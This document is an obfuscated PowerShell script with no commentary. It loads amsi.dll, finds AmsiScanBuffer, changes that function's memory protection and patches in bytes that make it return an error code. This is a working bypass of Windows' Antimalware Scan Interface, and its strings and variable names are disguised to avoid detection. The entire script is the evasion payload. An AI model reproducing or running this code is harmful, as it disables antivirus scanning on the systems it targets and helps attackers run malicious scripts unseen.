$_bsHjPm = @"
using System;
using System.Runtime.InteropServices;
public class _bsHjPm {
    [DllImport("kernel32")]
    public static extern IntPtr GetProcAddress(IntPtr aan3TJYASXe4T, string TziYJ8nd0F);
    [DllImport("kernel32")]
    public static extern IntPtr LoadLibrary(string name);
    [DllImport("kernel32")]
    public static extern bool VirtualProtect(IntPtr TwiqjLrBoVF, UIntPtr dNIjG7Cp1N, uint nj3biANQYiwR, out uint SzNLp2);
}
"@

Add-Type $_bsHjPm

$lG96Cd5MvcFkoeWq = [_bsHjPm]::LoadLibrary("$([chAr]([BytE]0x61)+[cHar]([BYTE]0x6d)+[chAR](115*97/97)+[chaR](105+13-13)+[ChAR]([BYtE]0x2e)+[cHAR](100)+[ChAR]([BYTe]0x6c)+[chAR](108*79/79))")
$Ct3T6iBhQK1A7Xhn5 = [_bsHjPm]::GetProcAddress($lG96Cd5MvcFkoeWq, "$(('ÄmsìScãnBûf'+'fér').NOrMalIze([cHar]([BYte]0x46)+[cHAR]([BYTE]0x6f)+[chaR](114+67-67)+[CHAr]([Byte]0x6d)+[CHAR]([bYte]0x44)) -replace [Char]([BYte]0x5c)+[cHAr]([BYte]0x70)+[cHAR]([byTE]0x7b)+[Char]([BytE]0x4d)+[ChAR](110+59-59)+[CHAr]([BYtE]0x7d))")
$p = 0
[_bsHjPm]::VirtualProtect($Ct3T6iBhQK1A7Xhn5, [uint32]5, 0x40, [ref]$p)
$btZKuJM0ijSHJDNJClf = "0xB8"
$BZs3v2z22eXVmVO = "0x57"
$Kpmjpeeg = "0x00"
$PwVtf = "0x07"
$muWK1bF5GG = "0x80"
$xEuCWCDiAR3ZU = "0xC3"
$ZseNuPwgsR7T = [Byte[]] ($btZKuJM0ijSHJDNJClf,$BZs3v2z22eXVmVO,$Kpmjpeeg,$PwVtf,+$muWK1bF5GG,+$xEuCWCDiAR3ZU)
[System.Runtime.InteropServices.Marshal]::Copy($ZseNuPwgsR7T, 0, $Ct3T6iBhQK1A7Xhn5, 6)